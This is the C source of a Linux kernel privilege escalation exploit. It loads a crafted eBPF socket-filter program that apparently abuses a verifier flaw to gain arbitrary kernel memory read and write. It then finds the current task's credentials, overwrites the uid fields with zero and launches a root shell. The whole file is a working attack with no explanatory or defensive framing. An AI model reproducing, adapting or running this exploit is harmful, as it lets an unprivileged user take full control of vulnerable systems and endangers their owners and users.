#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <errno.h>
#include "bpf_insn_helper.h"

typedef uint32_t u32;
typedef int32_t s32;
typedef uint64_t u64;
typedef int64_t s64;

void logs(char *tag,char *buf){
    printf("[ s]: ");
    printf(" %s ",tag);
    printf(": %s\n",buf);
}
void logx(char *tag,uint32_t num){
    printf("[ x] ");
    printf(" %-20s ",tag);
    printf(": %-#8x\n",num);
}
void loglx(char *tag,uint64_t num){
    printf("[lx] ");
    printf(" %-20s ",tag);
    printf(": %-#16lx\n",num);
}
void bp(char *tag){
    printf("[bp] : %s\n",tag);
    getchar();
}

void init(){
    setbuf(stdin,0);
    setbuf(stdout,0);
}

int mapfd,progfd;
int sockets[2];
#define LOG_BUF_SIZE 65536
#define PROGSIZE 328
#define PHYS_OFFSET 0xffff880000000000
#define CRED_OFFSET 0x5b0 //0x5f8
#define UID_OFFSET 0x4

char bpf_log_buf[LOG_BUF_SIZE];

static int bpf_prog_load(enum bpf_prog_type prog_type,
		  const struct bpf_insn *insns, int prog_len,
		  const char *license, int kern_version) {
	union bpf_attr attr = {
		.prog_type = prog_type,
		.insns = (__u64)insns,
		.insn_cnt = prog_len / sizeof(struct bpf_insn),
		.license = (__u64)license,
		.log_buf = (__u64)bpf_log_buf,
		.log_size = LOG_BUF_SIZE,
		.log_level = 1,
	};

	attr.kern_version = kern_version;

	bpf_log_buf[0] = 0;

	return syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));
}

static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,
		   int max_entries) {
	union bpf_attr attr = {
		.map_type = map_type,
		.key_size = key_size,
		.value_size = value_size,
		.max_entries = max_entries
	};

	return syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
}

static int bpf_update_elem(uint64_t key, uint64_t value) {
	union bpf_attr attr = {
		.map_fd = mapfd,
		.key = (__u64)&key,
		.value = (__u64)&value,
		.flags = 0,
	};

	return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

static int bpf_lookup_elem(void *key, void *value) {
	union bpf_attr attr = {
		.map_fd = mapfd,
		.key = (__u64)key,
		.value = (__u64)value,
	};

	return syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
}
static void __exit(char *err) {
	fprintf(stderr, "error: %s\n", err);
	exit(-1);
}

static void writemsg(void) {
	char buffer[64];

	ssize_t n = write(sockets[0], buffer, sizeof(buffer));

	if (n < 0) {
		perror("write");
		return;
	}
	if (n != sizeof(buffer))
		fprintf(stderr, "short write: %lu\n", n);
}

#define __update_elem(a, b, c) \
	bpf_update_elem(0, (a)); \
	bpf_update_elem(1, (b)); \
	bpf_update_elem(2, (c)); \
	writemsg();

static uint64_t get_value(int key) {
	uint64_t value;

	if (bpf_lookup_elem(&key, &value))
		__exit(strerror(errno));

	return value;
}

static uint64_t __get_fp(void) {
	__update_elem(1, 0, 0);

	return get_value(2);
}

static uint64_t __read(uint64_t addr) {
	__update_elem(0, addr, 0);

	return get_value(2);
}

static void __write(uint64_t addr, uint64_t val) {
	__update_elem(2, addr, val);
}

static uint64_t get_sp(uint64_t addr) {
	return addr & ~(0x4000 - 1);
}

static void pwn(void) {
    printf("pwning\n");
	uint64_t fp, sp, task_struct, credptr, uidptr;

	fp = __get_fp();
    loglx("fpsome",fp);
	if (fp < PHYS_OFFSET)
		__exit("bogus fp");
	
	sp = get_sp(fp);
	if (sp < PHYS_OFFSET)
		__exit("bogus sp");
	
	task_struct = __read(sp);

	if (task_struct < PHYS_OFFSET)
		__exit("bogus task ptr");

	printf("task_struct = %lx\n", task_struct);

	credptr = __read(task_struct + CRED_OFFSET); // cred

	if (credptr < PHYS_OFFSET)
		__exit("bogus cred ptr");

    uidptr = credptr + UID_OFFSET; // uid
    /*uidptr = credptr + 4; // uid*/
	if (uidptr < PHYS_OFFSET)
		__exit("bogus uid ptr");

	printf("uidptr = %lx\n", uidptr);
	__write(uidptr, 0); 
	__write(uidptr+0x8, 0);
    __write(uidptr+0x10, 0);

	if (geteuid() == 0) {
		printf("spawning root shell\n");
        system("/bin/sh");
		exit(0);
	}
	__exit("not vulnerable?");

}
int main(int argc,char **argv){
    init();

     struct bpf_insn insns[] = {
         ALU_MOV_K(9,0xffffffff),           // [0]  r9 = 0xffffffff
         JMP_JNE_K(9,0xffffffff,2),         // [1]  if r9 != 0xffffffff:  jmp [4]
         ALU64_MOV_K(0,0x0),                // [2]  r0 = 0
         JMP_EXIT(),                        // [3]  exit
         LD_IMM_DW(9,1,3),                  // [4]  r9 =  mapfd
         BPF_INSN_NEG,                      // [5]
          //r6 = map[0]
         ALU64_MOV_X(1,9),                  // [6]  r1 =  r9
         ALU64_MOV_X(2,10),                 // [7]  r2 =  r10 (rbp)
         ALU64_ADD_K(2,-4),                 // [8]  r2 =  r2 -4 
         ST_MEM_W(10,-4,0),                 // [9]  [r10 - 4] =0
         JMP_CALL(BPF_FUNC_map_lookup_elem),// [10] map_lookup_elem 
         JMP_JNE_K(0,0,1),                  // [11] if r0 != 0 : jmp [13]
         JMP_EXIT(),                        // [12] exit
         LDX_MEM_DW(6,0,0),                 // [13] r6 = [r0]

         // r7 =map[1]
         ALU64_MOV_X(1,9),                  // [14]  r1 =  r9
         ALU64_MOV_X(2,10),                 // [15]  r2 =  r10 (rbp)
         ALU64_ADD_K(2,-4),                 // [16]  r2 =  r2 -4 
         ST_MEM_W(10,-4,1),                 // [17]  [r10 - 4] =0
         JMP_CALL(BPF_FUNC_map_lookup_elem),// [18] map_lookup_elem 
         JMP_JNE_K(0,0,1),                  // [19] if r0 != 0 : jmp [21]
         JMP_EXIT(),                        // [20] exit
         LDX_MEM_DW(7,0,0),                 // [21] r7 = [r0]
        
         // r8=map[2]
         ALU64_MOV_X(1,9),                  // [22]  r1 =  r9
         ALU64_MOV_X(2,10),                 // [23]  r2 =  r10 (rbp)
         ALU64_ADD_K(2,-4),                 // [24]  r2 =  r2 -4 
         ST_MEM_W(10,-4,2),                 // [25]  [r10 - 4] =0
         JMP_CALL(BPF_FUNC_map_lookup_elem),// [26] map_lookup_elem 
         JMP_JNE_K(0,0,1),                  // [27] if r0 != 0 : jmp [29]
         JMP_EXIT(),                        // [28] exit
         LDX_MEM_DW(8,0,0),                 // [29] r8 = [r0]

         ALU64_MOV_X(2,0),                  // [30] r2 =  r0
         ALU64_MOV_K(0,0),                  // [31] r0 =  0
         JMP_JNE_K(6,0,3),                  // [32] if r6 !=0: jmp [36]
         LDX_MEM_DW(3,7,0),                 // [33] r3 = [r7] (map[1])
         STX_MEM_DW(2,0,3),                 // [34] [r2] = r3
         JMP_EXIT(),                        // [35] exit
         JMP_JNE_K(6,1,2),                  // [36] if r6 !=1: jmp [39]
         STX_MEM_DW(2,0,10),                // [37] [r2] = r10
         JMP_EXIT(),                        // [38] exit
         STX_MEM_DW(7,0,8),                 // [39] [r7] = r8
         JMP_EXIT(),                        // [40] exit
        
     };
     /*for(int i=0;i<PROGSIZE/8;i++){*/
         /*loglx("code : ",*(u64 *)&insns[i]);*/
     /*}*/


     logx("insns",sizeof(insns));
	mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), sizeof(long long), 3);
	if (mapfd < 0)
		__exit(strerror(errno));
	puts("mapfd finished");
	progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,
			insns, sizeof(insns), "GPL", 0);

	if (progfd < 0){
		__exit(strerror(errno));
    }
    puts("progfd finish");
	if(socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets)){
		__exit(strerror(errno));
    }
	puts("socketpair finished");
	if(setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd)) < 0){
		__exit(strerror(errno));
    }

    pwn();
    return 0;
}
